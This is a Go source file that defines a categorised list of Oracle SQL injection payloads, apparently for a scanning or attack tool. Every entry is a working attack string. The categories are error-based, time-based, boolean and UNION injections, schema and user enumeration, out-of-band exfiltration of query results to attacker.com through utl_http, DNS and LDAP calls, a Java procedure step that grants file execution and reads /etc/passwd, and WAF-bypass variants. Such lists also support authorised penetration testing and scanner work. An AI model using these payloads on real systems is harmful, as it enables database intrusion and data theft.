package payloads

var Oracle = PayloadGroup{
	DBMS: "Oracle",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (XML, ctxsys, utl_inaddr)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=ctxsys.drithsx.sn(1,(select user from dual))--"},
		{Type: "error", Content: "' AND 1=utl_inaddr.get_host_address((select user from dual))--"},
		{Type: "error", Content: "' AND 1=dbms_utility.sqlid_to_sqlhash((select user from dual))--"},
		{Type: "error", Content: "' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))--"},
		{Type: "error", Content: "' AND 1=utl_inaddr.get_host_name((select user from dual))--"},
		{Type: "error", Content: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(126)||(SELECT USER FROM DUAL)||CHR(126)||CHR(62))) FROM DUAL) IS NOT NULL--"},
		{Type: "error", Content: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(126)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(126)||CHR(62))) FROM DUAL) IS NOT NULL--"},
		{Type: "error", Content: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(126)||(SELECT table_name FROM all_tables WHERE rownum=1)||CHR(126)||CHR(62))) FROM DUAL) IS NOT NULL--"},
		{Type: "error", Content: "' AND 1=dbms_xdb_version.checkin((select user from dual))--"},
		{Type: "error", Content: "' AND 1=dbms_xdb_version.makeversioned((select user from dual))--"},
		{Type: "error", Content: "' AND 1=dbms_xdb_version.uncheckout((select user from dual))--"},
		{Type: "error", Content: "' AND 1=dbms_utility.port_string--"},
		{Type: "error", Content: "' AND 1=ordsys.ord_dicom.getmapping((select user from dual),1,1)--"},
		{Type: "error", Content: "' AND 1=dbms_java_test.funcall('ORACLE','JAVA','TEST',(select user from dual))--"},

		// ═══════════════════════════════════════════
		// TIME-BASED (DBMS_LOCK.SLEEP, Heavy)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND 1=dbms_pipe.receive_message('RDS',5)--"},
		{Type: "time", Content: "' AND 1=dbms_pipe.receive_message('RDS',10)--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM DUAL WHERE 1=dbms_pipe.receive_message('X',5))--"},
		{Type: "time", Content: "' AND (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('X',5) ELSE 1 END FROM DUAL)--"},
		{Type: "time", Content: "' AND (SELECT CASE WHEN (1=2) THEN dbms_pipe.receive_message('X',5) ELSE 1 END FROM DUAL)--"},
		{Type: "time", Content: "' AND 1=dbms_lock.sleep(5)--"},
		{Type: "time", Content: "' AND (SELECT dbms_lock.sleep(5) FROM DUAL)--"},
		{Type: "time", Content: "1' AND (SELECT COUNT(*) FROM all_objects WHERE 1=1 AND dbms_pipe.receive_message('X',5)=0)--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT dbms_pipe.receive_message('X',5) FROM DUAL) a)--"},
		{Type: "time", Content: "' AND (SELECT dbms_pipe.receive_message('X',5) FROM dual WHERE 1=1)--"},
		{Type: "time", Content: "' AND (SELECT dbms_pipe.receive_message('X',5) FROM dual WHERE 1=2)--"},
		{Type: "time", Content: "' AND 1=utl_inaddr.get_host_address('127.0.0.1')--"},
		{Type: "time", Content: "' AND 1=utl_http.request('http://127.0.0.1')--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM all_objects WHERE 1=1 AND ROWNUM=1 AND dbms_lock.sleep(5)=0) a)--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND (SELECT 1 FROM DUAL)=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM DUAL)=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND 'a'='a'--", Expected: "true"},
		{Type: "boolean", Content: "' AND 'a'='b'--", Expected: "false"},
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' OR 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM all_tables)>0--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM nonexistent_table)=0--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM user_tables)>0--", Expected: "true"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' ORDER BY 1--"},
		{Type: "union", Content: "' ORDER BY 2--"},
		{Type: "union", Content: "' ORDER BY 3--"},
		{Type: "union", Content: "' ORDER BY 4--"},
		{Type: "union", Content: "' UNION SELECT NULL FROM DUAL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL FROM DUAL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL FROM DUAL--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3 FROM DUAL--"},
		{Type: "union", Content: "' UNION SELECT banner,NULL FROM v$version--"},
		{Type: "union", Content: "' UNION SELECT user,NULL FROM DUAL--"},
		{Type: "union", Content: "' UNION SELECT global_name,NULL FROM global_name--"},
		{Type: "union", Content: "' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1--"},
		{Type: "union", Content: "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS' AND rownum=1--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT table_name,NULL FROM all_tables--"},
		{Type: "deep", Content: "' UNION SELECT DISTINCT owner,NULL FROM all_tables--"},
		{Type: "deep", Content: "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--"},
		{Type: "deep", Content: "' UNION SELECT username,NULL FROM all_users--"},
		{Type: "deep", Content: "' UNION SELECT name,NULL FROM v$database--"},
		{Type: "deep", Content: "' UNION SELECT instance_name,NULL FROM v$instance--"},
		{Type: "deep", Content: "' UNION SELECT version,NULL FROM v$instance--"},
		{Type: "deep", Content: "' UNION SELECT banner FROM v$version--"},
		{Type: "deep", Content: "' UNION SELECT chr(60)||chr(58)||chr(126)||(SELECT user FROM dual)||chr(126)||chr(62) FROM dual--"},
		{Type: "deep", Content: "' UNION SELECT SYS.DATABASE_NAME FROM DUAL--"},
		{Type: "deep", Content: "' UNION SELECT global_name FROM global_name--"},

		// ═══════════════════════════════════════════
		// OOB EXFILTRATION (UTL_HTTP, UTL_TCP)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' AND utl_http.request('http://attacker.com/'||(SELECT user FROM dual))=1--"},
		{Type: "deep", Content: "' AND utl_http.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1--"},
		{Type: "deep", Content: "' AND utl_inaddr.get_host_address((SELECT user FROM dual)||'.attacker.com')=1--"},
		{Type: "deep", Content: "' AND utl_http.request('http://attacker.com/'||(SELECT table_name FROM all_tables WHERE rownum=1))=1--"},
		{Type: "deep", Content: "' AND dbms_ldap.init((SELECT user FROM dual)||'.attacker.com',80)=1--"},

		// ═══════════════════════════════════════════
		// JAVA STORED PROCEDURE EXECUTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "'; EXEC dbms_java.grant_permission('PUBLIC','SYS:java.io.FilePermission','<<ALL FILES>>','execute');--"},
		{Type: "deep", Content: "'; SELECT dbms_java.runjava('oracle/aurora/server/ws_server/OALaunchClass org.apache.commons.io.FileUtils.readFileToString(new java.io.File(\"/etc/passwd\"))') FROM DUAL;--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "' OR 1=1--"},
		{Type: "bypass", Content: "' OR 1=1-- -"},
		{Type: "bypass", Content: "' OR 1=1 #"},
		{Type: "bypass", Content: "1' OR 1=1--"},
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%09OR%091=1--"},
		{Type: "bypass", Content: "'%0AOR%0A1=1--"},
		{Type: "bypass", Content: "admin' OR '1'='1'--"},
	},
}
